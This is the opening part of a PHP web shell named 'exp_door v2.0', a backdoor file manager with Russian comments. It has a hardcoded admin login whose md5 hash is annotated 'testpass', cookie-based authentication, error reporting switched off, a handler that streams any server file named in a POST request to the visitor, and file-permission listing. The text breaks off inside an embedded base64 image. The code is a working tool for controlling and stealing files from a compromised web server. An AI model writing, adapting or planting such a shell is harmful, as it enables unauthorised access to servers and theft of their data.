<?php
if (isset($_POST['load']) && !empty($_POST['choose'])) {
    $file = $_POST['choose'][0];
    if (is_readable($file)) {
        if (file_exists($file)) {
            if (ob_get_level()) {
                ob_end_clean();
            }
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
    }
}
function showForm()
{
    $string = "<form action='" . $_SERVER["SCRIPT_NAME"] . "' method='post'>";
    $string .= "<label>Login:</label>" . '<br>';
    $string .= "<input type='text' name='login'>" . '<br>';
    $string .= "<label>Passwd: </label>" . '<br>';
    $string .= "<input type='password' name='pass'>" . '<br>' . '<br>';
    $string .= "<input type='submit' name='log' value='Sign up'>";
    $string .= "</form>";
    return $string;
}

function check($login, $pass)
{
    if (($login == "admin") && ($pass == "179ad45c6ce2cb97cf1029e212046e81")) return true; //testpass
    else return false;
}

if (isset($_POST['log'])) {
    $login = $_POST['login'];
    $pass = md5($_POST['pass']);
    if (check($login, $pass)) {
        setcookie("login", $login);
        setcookie("pass", $pass);
        header("Refresh:0"); // или header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);

    } else echo "Access denied!";
}
if (isset($_POST['exit'])) {
    setcookie("login", $login, time() - 3600, '/');
    setcookie("pass", $pass, time() - 3600, '/');
    header("Refresh:0");
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>exp_door v2.0</title>
    <link href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAOKAAADigGnjPUfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAg9JREFUeNrEV4GRgyAQjJkUQAl+BW8JlGAJfgeWQAmW4HdgCZRgCSmBDnhufsnfXBDBOB9nbhI54Ja95cDGe39553Mt6dQ0TUv2NgDhoeDdBrjuPwC4YHrDN70CoCnVQFgpgWhDfyfaaYKP0H4/AuAmJusF1RRsRlBLFvpoAeIL7YZ+q4EQA2CBghtmNBE51mAKKfARFNiIY8m3wE/jhujbs7zzNxD9GfFu8B6N8q9Y/xZMeTD3MgAVWWBtgwCxchDoE0FMLwEQk/GVdgicBAF/9LW5+a8JtQ/BxmAKTRa/mumGGKEg32j6FNtRiRqyL0Kx6iXSzsQ37zBE1qGNs6OrU4Ad4RFcscnGRF+uiVkI1Ul9lAKIkw6JFd35qhhDMSAXqDkkQraKUTDiBZBJpECaOgrAyvwhmK+w9XAdYJTrDWZKzRwVoecaED7NynSpxfKtahlIVTldwIRDyjT0MzPdqBIAs5jQJhS+mfvkSv92li0B0FYElDtDZcq6eRJ3pnO3k+s10dZvpGsUh5upOYy0MCVOywjEJcY9FSX0f6ThVnBhsRmfC4fWgsNoFe5RvGt2y6q+lJ7xxKtax07Yy6X06rSTor0UOATupVbOAKDYjhkSu+mhG6TpXnUjKgRh+Ep3akt/OgBRPR2KjoL1zDdU3wkrUzFlClSfGtec/XWMj1jN7oI2t5Wbd3+e/wgwAGD4W8SG5D6lAAAAAElFTkSuQmCC"
          rel="icon" type="image/png"/>
    <meta charset="utf-8">
    <style type="text/css">
        html {
            background: #F1F3F5;
        }

        body {
            margin: 0;
            background: #F1F3F5;
        }

        pre {
            margin: 0;
        }

        img {
            vertical-align: middle;
        }

        .ya {
            width: 178px !important;
            box-shadow: none;
            border-collapse: separate;
        }

        .col {
            width: 0;
            white-space: nowrap;
            padding-right: 50px;
        }

        .all {
            font-family: Arial, Helvetica, sans-serif;
            font-weight: bold;
            font-size: 12px;
        }

        a, a:visited {
            color: #1d5405;
            text-decoration: none;
        }

        #main {
            margin: auto;
            background: #F1F3F5;
            min-height: 100vh;
        }

        #tab {
            background: #E9ECEF;
            padding-left: 1px;
            border: 1px solid #cccccc;
            margin: 5px
        }

        #result {
            background: #E9ECEF;
            padding: 5px;
            border: 1px solid #cccccc;
            margin: 5px;
            min-height: 68vh;
        }

        #firsttab {
            width: 100%;
            border-collapse: collapse;
        }

        .hat {
            padding-right: 5px;
            padding-left: 5px;
            font-weight: normal;
        }

        .block-hide {
            margin: 0 auto;
            padding: 5px;
        }

        .to-be-changed {
            position: absolute;
            z-index: 10;
            width: calc(100% - 10px);
            background: #F1F3F5;
        }

        .to-be-changed:target {
            display: none;
        }

        .open {
            display: block;
            font-weight: 400;
            margin: 0 5px 5px 5px;
            position: absolute;
            z-index: 1;
            width: calc(100% - 20px);
        }

        .hat form {
            color: red;
            font-size: 16px;
            text-align: center;
            width: 200px;
            left: calc(50% - 100px);
            top: 2%;
            position: absolute;
        }

        .openf {
            border: none;
            background: #E9ECEF00;
            cursor: pointer
        }

        .demos {
            margin-left: 5px;
            padding: 4px;
            text-align: center;
            background: #0d0d0d1a;
            border: 1px solid #cccccc;
            font-weight: bold;
            width: 64px;
            border-radius: 3px;
        }

        .demolink {
            background-color: #f8f4f400 !important;
            color: #1d5405 !important;
        }

        .cbox {
            width: 18px
        }

        table.to td {
            overflow: hidden;
        }

        table.to td:nth-of-type(1) {
            width: auto;
        }

        table.to td:nth-of-type(2) {
            width: 50px;
        }

        table.to td:nth-of-type(3) {
            width: auto;
        }

        tr.note:hover {
            background: #f5f5f5;
        }

        tr.note:focus {
            background-color: #8FBC8F;
            outline: 1px solid grey;
        }

        .modalbackground {
            margin: 0; /* убираем отступы */
            padding: 0; /* убираем отступы */
            position: fixed; /* фиксируем положение */
            top: 0; /* растягиваем блок по всему экрану */
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0, 0, 0, 0.5); /* полупрозрачный цвет фона */
            z-index: 100; /* выводим фон поверх всех слоев на странице браузера */
            opacity: 0; /* Делаем невидимым */
            pointer-events: none; /* элемент невидим для событий мыши */
        }

        /* при отображении модального окно - именно здесь начинается магия */
        .modalbackground:target {
            opacity: 1; /* делаем окно видимым */
            pointer-events: auto; /* элемент видим для событий мыши */
            text-align: center
        }

        /* ширина диалогового окна и его отступы от экрана */
        .modalwindow {
            display: inline-block;
            margin: 10% auto;
            padding: 1%;
            background: #fff;
            border-radius: 3px;
            font-size: 16px;
        }

        .modalwindow2 {
            display: inline-block;
            margin: 2% auto;
            padding: 1%;
            background: #fff;
            border-radius: 3px;
            font-size: 16px;
            height: 80%;
            width: 90%;
        }

        /* оформление сообщение */
        .modalwindow p {
            padding: 0;
            margin: 4% 0 8% 0;
            text-align: center;
        }

        .modalwindow2 p {
            padding: 0;
            margin: 4% 0 4% 0;
            text-align: center;
        }

        /* вид кнопки ЗАКРЫТЬ */
        .modalwindow a {
            display: block;
            color: #fff;
            background: #369;
            padding: 1%;
            margin: 0 auto;
            width: 50%;
            border-radius: 3px;
            text-align: center;
            text-decoration: none;
        }

        .modalwindow2 a {
            display: block;
            color: #fff;
            background: #369;
            padding: 6px;
            margin: 0 auto;
            width: 120px;
            border-radius: 3px;
            text-align: center;
            text-decoration: none;
        }

        /* вид кнопки ЗАКРЫТЬ при наведении на нее мыши */
        .modalwindow a:hover {
            background: #47a;
        }

        #inner1 {
            float: right;
        }

        #inner2 {
            float: right;
            clear: right;
        }

        hr {
            border: 1px !important;
            height: 1px;
            background-color: #ccc;
            width: 100% !important;
        }

        .hide {
            font-size: 14px;
            margin-right: 20px;
            background-color: #F1F3F5 !important;
            color: #1d5405 !important;
            margin-left: 1px;
            font-weight: bold;
            text-decoration: underline !important;
        }

        .new {
            font-size: 14px;
            font-weight: 400;
            width: 100%;
        }

        .center {
            font-size: 16px;
            font-weight: 400;
        }

        .error {
            text-align: center;
            font-size: 24px;
            color: red;
            display: block;
            margin: 0 auto;
        }

        .a_size {
            font-size: 18px;
        }

        td:not(:first-child) {
            padding-left: 8px;
        }

        /*Аналогично кроме первого nth-child(n+2)*/
        .area {
            width: 96%;
            height: 85%;
            border: 1px solid #cccccc;
            margin: 10px auto;
            overflow-y: auto;
            word-wrap: break-word;
            text-align: left;
            font-weight: normal;
            font-size: 12px
        }

        .bt {
            color: #008800;
        }

        .pm {
            font-weight: 700;
            font-size: 14px;
            color: red
        }
    </style>
</head>
<body>

<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
function printPerms($file)
{
    $mode = fileperms($file);
    if ($mode & 0x1000) {
        $type = 'p';
    } else if ($mode & 0x2000) {
        $type = 'c';
    } else if ($mode & 0x4000) {
        $type = 'd';
    } else if ($mode & 0x6000) {
        $type = 'b';
    } else if ($mode & 0x8000) {
        $type = '-';
    } else if ($mode & 0xA000) {
        $type = 'l';
    } else if ($mode & 0xC000) {
        $type = 's';
    } else $type = 'u';
    $owner["read"] = ($mode & 00400) ? 'r' : '-';
    $owner["write"] = ($mode & 00200) ? 'w' : '-';
    $owner["execute"] = ($mode & 00100) ? 'x' : '-';
    $group["read"] = ($mode & 00040) ? 'r' : '-';
    $group["write"] = ($mode & 00020) ? 'w' : '-';
    $group["execute"] = ($mode & 00010) ? 'x' : '-';
    $world["read"] = ($mode & 00004) ? 'r' : '-';
    $world["write"] = ($mode & 00002) ? 'w' : '-';
    $world["execute"] = ($mode & 00001) ? 'x' : '-';
    if ($mode & 0x800) $owner["execute"] = ($owner['execute'] == 'x') ? 's' : 'S';
    if ($mode & 0x400) $group["execute"] = ($group['execute'] == 'x') ? 's' : 'S';
    if ($mode & 0x200) $world["execute"] = ($world['execute'] == 'x') ? 't' : 'T';
    $s = sprintf("%1s", $type);
    $s .= sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
    $s .= sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
    $s .= sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
    if (strpos($s, '---', -3)) {
        return '<font color="#FF0000"><b>' . $s . '</b></font>';
    } elseif (strpos($s, 'rw', -3)) {
        return '<font color="#008000"><b>' . $s . '</b></font>';
    } else {
        return '<font color="#000000"><b>' . $s . '</b></font>';
    }
}

function numPerms($file)
{
    $numperm = substr(sprintf('%o', fileperms($file)), -4);
    if ((int)(substr($numperm, 0, 1)) > 1) {
        return '<font color="#FF8C00"><b>' . $numperm . '</b></font>';
    } else {
        return '<font color="#000000"><b>' . $numperm . '</b></font>';
    }
}

$home = '
<div class="all" id="main">
<div class="block-hide">
<div class="hat">
<div>
        <div id="inner1"><img src="data:image/png;base64,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